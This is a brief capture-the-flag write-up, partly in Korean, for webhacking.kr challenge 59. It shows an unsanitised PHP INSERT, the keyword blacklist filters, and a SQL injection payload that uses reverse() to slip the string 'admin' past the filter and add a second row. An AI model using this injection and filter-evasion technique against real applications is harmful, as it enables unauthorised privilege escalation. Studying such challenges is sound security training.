================================================================================================================
[webhacking.kr] 59
================================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5;
        }
        step0 -> step1[label="post_data: {id=nimda&phone=1,reverse(id)),(1,1}",arrowhead="normal"];
        step3 -> step2[label="Add user",arrowhead="normal"];
    }

|


server -> DB
================================================================================================================

- PHP
- POST 파라미터: id, phone

.. code-block:: sql

    insert into c59 
    values('$_POST[id]',$_POST[phone],'guest')

|

insert
================================================================================================================

- admin 문자열에 대해 필터링이 걸려있기 때문에, reverse 함수를 이용하여 admin 문자열을 거꾸로 입력하는 방식을 사용합니다.
- eregi("admin",$_POST[id])
- eregi("admin|0x|#|hex|char|ascii|ord|from|select|union",$_POST[phone])

.. code-block:: javascript

    $_POST[id] = nimda
    $_POST[phone] = 1,reverse(id)),(1,1

|